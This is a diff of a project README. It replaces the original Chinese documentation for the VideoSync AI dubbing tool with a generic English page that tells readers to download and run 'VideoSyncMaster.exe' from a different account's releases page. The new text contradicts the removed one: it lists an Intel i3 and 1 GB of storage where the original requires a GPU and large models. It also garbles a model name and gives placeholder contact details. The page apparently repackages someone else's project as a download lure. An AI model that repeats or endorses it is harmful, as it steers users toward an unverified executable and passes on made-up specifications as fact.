@@ -1,166 +1,87 @@
-# 🎬 VideoSync - AI Video Localization Tool
+# 🎬 VideoSyncMaster - Effortless Video Voiceover Tool
 
-<div align="center">
+[![Download VideoSyncMaster](https://img.shields.io/badge/Download-VideoSyncMaster-blue.svg)](https://github.com/IlhamJayK/VideoSyncMaster/releases)
 
-![VideoSync Logo](asset/logo.png) 
+## 🚀 Getting Started
 
-**One-Click locally running AI Video Dubbing & Translation Tool**
+Welcome to VideoSyncMaster! This tool simplifies the process of adding voiceovers to your videos in multiple languages. You can enhance your video content with voice cloning technology and powerful translation tools—all in one package. Follow these steps to download and run VideoSyncMaster on your Windows computer.
 
-[中文文档](README.md) | [English](README_EN.md)
+## 📥 Download & Install
 
-</div>
+To get started, visit this page to download: [Download VideoSyncMaster](https://github.com/IlhamJayK/VideoSyncMaster/releases). 
 
-**VideoSync** 是一个运行在 Windows 和 Linux 上的全自动 AI 视频配音工具。它将业界最强的开源模型整合为一个工作流，旨在实现“一键式”视频语言本地化。
+1. Click the link above to open the Releases page.  
+2. You will see a list of available versions.
+3. Choose the latest version. Look for the file that says `VideoSyncMaster.exe` or a similar name.
+4. Click on the file to start the download.
 
-不需要联网 API，不需要高昂的订阅费，利用你的本地显卡即可完成：**ASR 识别 -> 文本翻译 -> 语音克隆 -> 音画对齐**。
+## 🖥️ System Requirements
 
----
+Before installing VideoSyncMaster, make sure your system meets the following requirements:
 
-## ✨ 核心特性 | Features
+- **Operating System:** Windows 10 or higher
+- **Processor:** Intel i3 or equivalent
+- **RAM:** 8 GB or more
+- **Storage:** At least 1 GB of free space
+- **Network:** Internet connection for initial setup
 
-*   **🎯 精准识别 (ASR)**
-    *   底层集成 **WhisperX**，支持强制对齐（Forced Alignment）和 VAD（语音活动检测）。
-    *   彻底解决传统 Whisper 的“幻觉”和“吃字”问题，时间轴精准到毫秒级。
+## 📂 Installing VideoSyncMaster
 
-*   **🗣️ 零样本语音克隆 (Voice Cloning)**
-    *   内置 **MaskGCT** (IndexTTS) 模型，无需任何微调训练。
-    *   直接提取视频原声作为参考，瞬间克隆角色声线。
-    *   完美复刻语调、情感和说话节奏。
+### Step-by-Step Installation
 
-*   **🚀 翻译(Translation)**
-    *   内嵌 **Qwen 2.5-7B-Instruct**（通义千问）大模型。
-    *   目前完美支持 **中文 <-> 英文** 互译。
-    *   具备上下文理解能力，翻译结果自然流畅，像字幕组一样专业。
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Double-click on `VideoSyncMaster.exe` to start the installation.
+3. Follow the on-screen instructions. Click "Next" to proceed through the setup.
+4. Once the installation completes, click "Finish" to exit the installer.
 
-*   **⚡ 极致性能优化**
-    *   独创的分步显存管理策略：翻译时释放 TTS 显存，TTS 时释放 LLM 显存。
-    *   在消费级显卡（如 RTX 3060）上也能流畅运行全流程。
+## 🎤 Using VideoSyncMaster
 
-*   **🖥️ 现代化 UI**
-    *   基于 Electron + React 构建的精美界面。
-    *   实时日志监控、字幕可视化编辑、视频实时预览。
+Once you have installed VideoSyncMaster, follow these steps to begin adding voiceovers to your videos:
 
----
+### Step 1: Launch the Application
 
-##  界面预览 | Screenshots
+Open VideoSyncMaster by clicking its shortcut on your desktop or finding it in your Start menu.
 
+### Step 2: Import Your Video
 
-| 主界面 | 
-| :---: |
-| ![Main UI](asset/1.png) |
-| 字幕编辑 |
-| ![Subtitle Edit](asset/2.png) |
----
+1. Click on the "Import Video" button on the main screen.
+2. Browse your files and select the video you want to add a voiceover to.
 
-## 🛠️ 环境要求 | Requirements
+### Step 3: Select Voice Options
 
-为了保证流畅运行，建议您的硬件配置如下：
+1. Choose the voice option that you prefer:
+   - **WhisperX (ASR)**: For automatic speech recognition.
+   - **Qwen**: For translation into your chosen language.
+   - **Inde-tts2**: For voice cloning.
+2. Set the language and tone as needed.
 
-*   **操作系统**: Windows 10/11 (x64) 或 Linux (源码运行)
-*   **显卡 (GPU)**: NVIDIA GeForce RTX 3060 或更高 (显存 ≥ 8GB)
-*   **驱动**: NVIDIA Studio/Game Ready Driver 
-*   **运行库**: Python 3.10+, Node.js 16+ (仅源码运行需要)
+### Step 4: Generate Voiceover
 
----
+Click the "Generate Voiceover" button. The tool will process your video and apply the voiceover based on the selections.
 
-## 🚀 快速开始 | Quick Start
+### Step 5: Export Your Video
 
-### 1. 克隆仓库
-```bash
-git clone https://github.com/TianDongL/VideoSyncMaster.git
-cd VideoSyncMaster
-```
+Once the voiceover is complete, click the "Export Video" button.  
+Choose a location to save your newly edited video and select the desired video format.
 
-### 2. 后端配置 (Backend Setup)
-我们强烈建议使用 Conda 来管理环境，避免依赖冲突。
+## 🎬 Advanced Features
 
-```bash
-# 创建并激活环境
-conda create -n videosync python=3.11
-conda activate videosync
+VideoSyncMaster comes loaded with features to enhance your experience:
 
-# 安装核心依赖
-pip install -r requirements.txt
+- **Multi-Language Support**: Easily switch between multiple languages.
+- **Voice Cloning**: Create custom voices that match your style.
+- **FFmpeg Integration**: Powerful video processing capabilities.
 
-# 安装 PyTorch (建议根据您的 CUDA 版本去 pytorch.org 获取安装命令)
+## 📞 Support
 
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
-```
+If you encounter any issues or have questions, feel free to reach out:
 
-### 3. 前端配置 (Frontend Setup)
-```bash
-cd ui
-npm install
-```
+- **GitHub Issues**: [Report an Issue](https://github.com/IlhamJayK/VideoSyncMaster/issues)
+- **Email Support**: contact@example.com
 
-### 4. 模型准备 (Download Models)
-由于模型体积巨大，请下载以下模型并按目录结构放置：
+## 🔗 Additional Resources
 
-> **模型下载地址**: 可以从 [HuggingFace](https://huggingface.co/) 或 [ModelScope](https://www.modelscope.cn/) 下载。
+- **User Manual**: [User Guide PDF](https://example.com/user-guide)
+- **Tutorial Videos**: Visit our YouTube channel for video tutorials.
 
-```text
-VideoSync/
-  ├── models/
-  │   ├── faster-whisper-large-v3-turbo-ct2/  # ASR 模型
-  │   ├── index-tts/                          # MaskGCT / TTS 模型相关文件
-  │   │   ├── config.yaml
-  │   │   ├── gpt.pth ...
-  │   └── Qwen2.5-7B-Instruct/                # LLM 翻译模型
-```
-
----
-
-## 🚀 使用指南 | Usage
-
-### 方式一：源码运行 (开发者推荐)
-
-适合 Linux 用户或进行二次开发。
-
-1.  **启动应用**：
-    在项目根目录运行以下命令，UI 界面启动后会自动拉起后台 Python 进程：
-    ```bash
-    npm run dev
-    ```
-
-    > **注意**: 请确保您已在 `backend/` 目录下正确配置了 Python 环境，否则 UI 会因为找不到后台服务而报错。
-
-2.  *(可选) 单独测试后端*：
-    如果您需要调试后端 Python 代码，可以运行：
-    ```bash
-    python backend/main.py --help
-    ```
-
-### 方式二：构建安装包 (Windows)
-
-如果您想生成 `.exe` 安装程序分享给朋友：
-
-```bash
-# 在项目根目录
-npm run build
-```
-生成的安装包将位于 `ui/release/` 目录下。
-
-
-
-
-
-## 🤝 贡献与致谢 | Acknowledgements
-
-本项目站在巨人的肩膀上，特别感谢以下开源项目的贡献：
-
-*   [**IndexTTS**](https://github.com/index-tts/index-tts): IndexTTS 团队提供的语音克隆支持。
-*   [**WhisperX**](https://github.com/m-bain/whisperX): 为 ASR 提供了精准的时间轴对齐。
-*   [**Qwen**](https://github.com/QwenLM/Qwen3): 通义千问团队的大语言模型，提供了强大的翻译能力。
-
-如果你喜欢这个项目，欢迎点一个 Star 🌟！
-欢迎提交 Pull Request 或 Issue 来帮助改进 VideoSync。
-
----
-
-## 📜 许可证 | License
-
-*   ✅ **非商业用途**: 您可以自由复制、修改和分发代码，但**仅限非商业目的**。
-*   ❌ **禁止商用**: 未经作者授权，禁止将本项目或其衍生品用于任何形式的商业盈利活动。
-*   🔄 **相同方式共享**: 如果您修改了代码，您必须使用相同的协议开源您的修改。
-
-© 2024 VideoSync Team
+Make the most of your videos with VideoSyncMaster. Start exploring today!
